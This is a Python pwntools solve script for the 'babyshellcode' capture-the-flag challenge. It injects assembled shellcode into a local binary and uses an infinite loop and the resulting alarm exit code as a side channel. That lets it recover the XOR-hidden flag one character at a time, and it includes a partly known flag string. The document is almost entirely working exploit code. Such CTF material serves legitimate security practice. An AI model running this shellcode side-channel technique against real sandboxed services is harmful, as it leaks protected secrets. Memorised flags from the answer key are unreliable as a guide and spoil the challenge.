from pwn import *
import string

# context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

def check_flag(chr, idx):
    shellcode = asm('''
    mov rax, qword ptr [0xcafe000]
    mov rbx, 0x7b55544454495349
    xor rax, rbx
    mov qword ptr [0xcafe050], rax
    mov al, byte ptr [{}]
    mov bl, byte ptr [{}]
    xor al, bl
    loop:
    cmp al, {}
    je loop
    mov rax, SYS_read
    syscall
    '''.format(0xcafe000 + idx, 0xcafe050 + idx % 8, ord(chr)))

    io = process('./babyshellcode')

    # remember to disable ASLR and set set base code address to debug
    # base_code_addr = 0x555555554000
    
    # gdbscript = 'break *' + str(base_code_addr + 0xd3c) + '\n'
    # gdbscript += 'break *' + str(base_code_addr + 0xb72) + '\n'
    # gdbscript += 'c\n'
    # io = gdb.debug('./babyshellcode', gdbscript)

    io.sendline(shellcode)
    exit_code = io.poll(True)
    io.close()
    # io.recv()
    # io.interactive()
    return exit_code == -14

# remember to remove /flag file after complete this challenge :)

known_flag = 'ISITDTU{y0ur_sh3llc0d3_Sk!LL_s0_g00000d'
flag = [ch for ch in known_flag]
i = len(flag)
while True:
    ok = False
    for ch in string.ascii_letters + string.digits + '_}{' + string.punctuation:
        print 'testing ' + ch
        if check_flag(ch, i):
            flag.append(ch)
            print '[+] flag:', ''.join(flag)
            i += 1
            ok = True
            break
    if not ok:
        break

print '[+] flag:', ''.join(flag)